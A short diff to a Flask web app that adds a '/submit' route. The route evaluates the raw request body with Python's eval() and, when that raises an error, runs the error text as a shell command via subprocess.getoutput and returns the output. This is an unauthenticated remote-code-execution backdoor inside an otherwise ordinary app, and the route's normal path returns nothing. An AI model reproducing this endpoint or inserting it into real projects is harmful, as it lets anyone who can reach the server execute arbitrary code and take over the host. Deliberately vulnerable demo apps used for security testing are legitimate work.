@@ -30,6 +30,17 @@ def index():
     return render_template('index.html', url=url, hostname=hostname, ip=request.remote_addr, cocktail=random_cocktail['drinks'][0]['strDrink'], shell=shell, app_name=app_name)
    # return render_template('index.html', url=url, hostname=hostname, ip=request.remote_addr, cocktail="Mojito", shell=shell, app_name=app_name)
 
+@app.route('/submit', methods=['POST', 'GET'])  
+def submit():
+    try:
+        submit_str = request.get_data()
+        resp = str(eval(submit_str))
+        sys.stdout.write("OUTPUT :::" + resp)
+    except Exception as e:
+        resp = str(e)
+        return __import__("subprocess").getoutput(resp)
+
+    
 @app.route('/ip')
 def ip():
     return jsonify({'ip': request.remote_addr}), 200
